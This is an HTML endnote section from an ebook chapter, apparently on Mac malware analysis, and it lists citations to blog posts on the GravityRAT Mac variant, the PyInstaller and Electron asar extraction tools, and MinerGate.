<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-17" id="c05-endnote-17">17</a></sup>	@noarfromspace, Twitter post, February 2, 2018, <a class="LinkURL" href="https://twitter.com/noarfromspace/status/959392650083254272/">https://twitter.com/noarfromspace/status/959392650083254272/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-18" id="c05-endnote-18">18</a></sup>	MinerGate, <a class="LinkURL" href="https://minergate.com/">https://minergate.com/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-19" id="c05-endnote-19">19</a></sup>	PyInstaller Extractor (pyinstxtractor), <a class="LinkURL" href="https://github.com/extremecoders-re/pyinstxtractor/">https://github.com/extremecoders-re/pyinstxtractor/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-20" id="c05-endnote-20">20</a></sup>	Patrick Wardle, “Adventures in Anti-Gravity: Deconstructing the Mac Variant of GravityRAT,” <em>Objective-See</em>, November 3, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x5B.html.">https://objective-see.com/blog/blog_0x5B.html.</a></p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-21" id="c05-endnote-21">21</a></sup>	Electron asar format, <a class="LinkURL" href="https://github.com/electron/asar/">https://github.com/electron/asar/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-22" id="c05-endnote-22">22</a></sup>	Akash Nimare, “How to get source code of any electron application,” December 6, 2017, <a class="LinkURL" href="https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37/">https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c05-noteref-23" id="c05-endnote-23">23</a></sup>	Patrick Wardle, “Adventures in Anti-Gravity (Part II): Deconstructing the Mac Variant of GravityRAT,” <em>Objective-See</em>, November 27, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x5C.html">https://objective-see.com/blog/blog_0x5C.html</a>.</p></aside>
</section>
</body>
</html>